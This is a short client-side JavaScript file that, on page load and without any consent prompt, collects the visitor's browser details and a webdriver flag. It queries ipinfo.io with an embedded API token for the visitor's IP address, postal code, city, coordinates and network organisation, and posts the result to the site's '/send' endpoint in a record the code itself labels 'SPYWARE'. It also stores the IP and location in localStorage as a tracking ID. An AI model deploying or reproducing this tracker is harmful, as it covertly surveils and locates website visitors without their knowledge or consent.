window.onload = GetNonPermData();


async function GetNonPermData(){
    var agent = navigator.userAgent;
    var lang = navigator.language;
    var cores = navigator.hardwareConcurrency;
    var isRobot = navigator.webdriver;

    console.log('GetNonPermData')

    //get that jucy data
    const request = await fetch("https://ipinfo.io/json?token=e692731e0ece1d");
    const res = await request.json();

    //creates databse entry client side
    const data = {
        TYPE:"SPYWARE",
        NONPERM:{
            AGENT:agent,
            LANGUAGE:lang,
            CORES:cores,
            WEBDRIVER: isRobot
        },
        ADVANCED:{
            GENERALLOCATION:{
                POST:res.postal, 
                CITY:res.city, 
                COUNTRY:res.country
            },
            LOCATION:res.loc,
            INTERNETDATA:{
                ORG:res.org, 
                HOST:res.hostname
            },
            INTERNETPROTOCALL:res.ip
        },
        PERMDATA:{
            NOTIFICATIONS:false,
            LOCATION:false,
            CLIPBOARD:false,
            MIC:false,
            CAMERA:false
        }
    }

    const options = {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    }

    //give me that jucy data pls
    fetch('/send', options);

    //store user id
    const UserID = {ID1:res.loc, ID2:res.ip}
    localStorage.setItem('USERID', JSON.stringify(UserID));
}